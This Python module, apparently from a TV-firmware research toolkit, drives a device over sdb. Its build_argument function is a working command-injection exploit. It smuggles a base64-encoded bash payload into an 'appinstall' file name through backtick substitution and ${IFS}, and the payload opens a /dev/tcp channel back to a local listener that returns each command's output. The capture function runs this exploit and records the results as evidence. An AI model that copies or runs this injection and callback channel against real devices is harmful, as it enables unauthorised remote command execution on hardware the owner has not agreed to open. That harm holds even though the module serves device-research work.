"""Firmware-specific SDK callback transport. No device access on import.

The appinstall filename uses shell command substitution, NOT a public shell API.
See docs/research.md. Never use untrusted command strings or parallel mutations.
"""
import base64
import ipaddress
import json
import re
import socket
import subprocess
import time
import uuid
from config import LOCAL


def build_argument(command, host, port, nonce):
    host = str(ipaddress.IPv4Address(host))
    if not 1 <= port <= 65535 or not re.fullmatch('[a-f0-9]{12}', nonce):
        raise ValueError('Invalid callback port or nonce')
    payload = (f'exec 3<>/dev/tcp/{host}/{port};'
               f'{{ echo CF_BEGIN_{nonce};{command};'
               f'echo CF_END_{nonce}; }} >&3 2>&3;exec 3>&-')
    encoded = base64.b64encode(payload.encode()).decode()
    argument = '0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}' + encoded + '|base64${IFS}-d|bash`.tpk'
    if len(argument.encode()) > 400:
        raise ValueError('Transport argument exceeds the reviewed 400-byte bound')
    return argument


def capture(config, command, label, timeout=15):
    if not re.fullmatch('[a-z0-9-]+', label):
        raise ValueError('Invalid evidence label')
    nonce = uuid.uuid4().hex[:12]
    evidence = LOCAL / 'evidence'
    evidence.mkdir(parents=True, exist_ok=True)
    chunks = []
    with socket.socket() as listener:
        listener.bind((config['host'], 0))
        listener.listen(1)
        listener.settimeout(timeout)
        arg = build_argument(command, config['host'], listener.getsockname()[1], nonce)
        proc = subprocess.Popen([config['sdb'], '-s', config['tv'] + ':26101', 'shell', arg],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        deadline = time.monotonic() + timeout
        try:
            connection, peer = listener.accept()
            with connection:
                if peer[0] != config['tv']:
                    raise RuntimeError('Unexpected callback peer')
                size = 0
                while True:
                    remaining = deadline - time.monotonic()
                    if remaining <= 0:
                        raise TimeoutError('SDK callback deadline exceeded; execution state unknown')
                    connection.settimeout(remaining)
                    block = connection.recv(65536)
                    if not block:
                        break
                    chunks.append(block)
                    size += len(block)
                    if size > 8000000:
                        raise RuntimeError('SDK callback exceeds size bound')
            output = b''.join(chunks).decode(errors='replace')
            if f'CF_BEGIN_{nonce}' not in output or f'CF_END_{nonce}' not in output:
                raise RuntimeError('Incomplete callback; execution state unknown')
            return output
        finally:
            try:
                stdout, stderr = proc.communicate(timeout=2)
            except subprocess.TimeoutExpired:
                proc.terminate()
                try:
                    stdout, stderr = proc.communicate(timeout=2)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    stdout, stderr = proc.communicate()
            record = {'time': time.time(), 'command': command, 'returncode': proc.returncode,
                      'stdout': stdout.decode(errors='replace'), 'stderr': stderr.decode(errors='replace'),
                      'callback': b''.join(chunks).decode(errors='replace')}
            (evidence / f'{label}-{nonce}.json').write_text(json.dumps(record, indent=2))
